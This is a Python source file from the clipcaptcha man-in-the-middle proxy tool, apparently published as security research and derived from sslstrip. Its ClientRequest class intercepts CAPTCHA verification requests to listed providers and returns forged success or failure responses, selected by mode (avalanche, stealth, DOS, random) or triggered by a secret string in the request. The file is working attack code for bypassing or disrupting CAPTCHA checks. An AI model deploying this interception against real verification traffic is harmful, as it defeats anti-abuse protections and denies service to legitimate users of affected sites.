# Copyright (c) 2012 Gursev Singh Kalra McAfee, Foundstone
# Copyright (c) 2004-2011 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

#these imports from libraries
import urlparse, logging, os, sys, random
import random

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

from twisted.internet import ssl
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

#these imports are from custome classes
from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
from SSLServerConnection import SSLServerConnection

from URLMonitor import URLMonitor
from DnsCache import DnsCache
from ProviderInfo import ProviderInfo
from clipcaptcha.Mode import Mode


class ClientRequest(Request):

	
	providersToClip = None
	operationMode = Mode.MONITOR
	secret = "clipcaptcha"

	@staticmethod
	def setProvidersToClip(providers):
		ClientRequest.providersToClip = providers
		

	@staticmethod
	def setOperationModeAndSecret(mode, secret):
		ClientRequest.operationMode = mode
		ClientRequest.secret = secret

	def __init__(self, channel, queued, reactor=reactor):
		Request.__init__(self, channel, queued)
		self.reactor	   = reactor
		self.urlMonitor	= URLMonitor.getInstance()
		self.dnsCache	  = DnsCache.getInstance()
	
	def findProvider(self, host, path):
		for provider in ClientRequest.providersToClip:
			#print provider.name
			if((provider.hostname == host) and (path.find(provider.path) != -1)):
				return provider
		return None


	def getPathFromUri(self):
		if (self.uri.find("http://") == 0):
			index = self.uri.find('/', 7)
			return self.uri[index:]

		return self.uri		


	def secretFound(self, path, headers, postData):
		secret = ClientRequest.secret
		if(path.find(secret) != -1):
			return True

		if(postData.find(secret) != -1):
			return True

		for key in headers.keys():
			if(key.find(secret) != -1):
				return True
		for value in headers.values():
			if(value.find(secret) != -1):
				return True

		return False

	def getAndPostArgs(self):

		self.content.read()
		return self.content.read() + self.getPathFromUri()

	def obtainHeaders(self):
		 headers = self.getAllHeaders().copy()
		 return headers


	def handleHostResolvedSuccess(self, address):
		logging.debug("Resolved host successfully: %s -> %s" % (self.getHeader('host'), address))
		host			= self.getHeader("host")
		client			= self.getClientIP()
		path			= self.getPathFromUri()
		headers                 = self.obtainHeaders()


		self.content.seek(0,0)
		postData		= self.content.read()
		url			= 'http://' + host + path
		clipCaptcha		= False

		self.dnsCache.cacheResolution(host, address)

		# All clipcaptcha magic comes here where CAPTCHA verification requests are analyzed and results returned

		# this if condition is NRQ (Not Required)
		captchaProvider = self.findProvider(host, path)
		#TODO : if the mode is stealth mode, all the CAPTCHAs that do not contain the bypassString should be sent forward
		if(ClientRequest.operationMode != Mode.MONITOR):
			if(captchaProvider != None):
				if(ClientRequest.operationMode == Mode.AVALANCHE or ClientRequest.operationMode == Mode.DOS or ClientRequest.operationMode == Mode.RANDOM):
					clipCaptcha = True
				if(clipCaptcha == False):
					#body = getBody()
					#if(secretFound(path, headers, body)):
					if(self.secretFound(path, headers, postData)):
						clipCaptcha = True
			else:
				clipCaptcha = False
			


		if(clipCaptcha):
			logging.debug("Clipping the CAPTCHA for " + captchaProvider.name)
			self.clipTheCAPTCHA(captchaProvider)
			
		# this if condition might be required to allow all traffic to go through as is
		elif (self.urlMonitor.isSecureLink(client, url)):
			logging.debug("Sending request via SSL...")
			self.proxyViaSSL(address, self.method, path, postData, headers, self.urlMonitor.getSecurePort(client, url))
		else:
			logging.debug("Sending request via HTTP...")
			self.proxyViaHTTP(address, self.method, path, postData, headers)


	def clipTheCAPTCHA(self, captchaProvider):
		mode = ClientRequest.operationMode
		if(mode == Mode.AVALANCHE or mode ==  Mode.STEALTH):
			#return true
			self.setResponseCode(captchaProvider.sCode, captchaProvider.sCodeStr)
			for hdr in captchaProvider.sHeaders:
				self.setHeader(hdr, captchaProvider.sHeaders[hdr])
			self.write(captchaProvider.sBody)
		elif(mode == Mode.DOS):
			#return false
			self.setResponseCode(captchaProvider.fCode, captchaProvider.fCodeStr)
			for hdr in captchaProvider.fHeaders:
				self.setHeader(hdr, captchaProvider.fHeaders[hdr])
			self.write(captchaProvider.fBody)
		elif(mode == Mode.RANDOM):
			r = random.randint(0,1)
			if(r == 0):
				self.setResponseCode(captchaProvider.sCode, captchaProvider.sCodeStr)
				for hdr in captchaProvider.sHeaders:
					self.setHeader(hdr, captchaProvider.sHeaders[hdr])
				self.write(captchaProvider.sBody)
			else:
				self.setResponseCode(captchaProvider.fCode, captchaProvider.fCodeStr)
				for hdr in captchaProvider.fHeaders:
					self.setHeader(hdr, captchaProvider.fHeaders[hdr])
				self.write(captchaProvider.fBody)

		self.finish()		
		
	def handleHostResolvedError(self, error):
		logging.warning("Host resolution error: " + str(error))
		self.finish()

	def resolveHost(self, host):
		address = self.dnsCache.getCachedAddress(host)

		if address != None:
			logging.debug("Host cached.")
			return defer.succeed(address)
		else:
			logging.debug("Host not cached.")
			return reactor.resolve(host)

	def process(self):
		logging.debug("Resolving host: %s" % (self.getHeader('host')))
		host	 = self.getHeader('host')			   
		deferred = self.resolveHost(host)

		deferred.addCallback(self.handleHostResolvedSuccess)
		deferred.addErrback(self.handleHostResolvedError)
		
	def proxyViaHTTP(self, host, method, path, postData, headers):
		connectionFactory		  = ServerConnectionFactory(method, path, postData, headers, self)
		connectionFactory.protocol = ServerConnection
		self.reactor.connectTCP(host, 80, connectionFactory)

	def proxyViaSSL(self, host, method, path, postData, headers, port):
		clientContextFactory	   = ssl.ClientContextFactory()
		connectionFactory		  = ServerConnectionFactory(method, path, postData, headers, self)
		connectionFactory.protocol = SSLServerConnection
		self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)

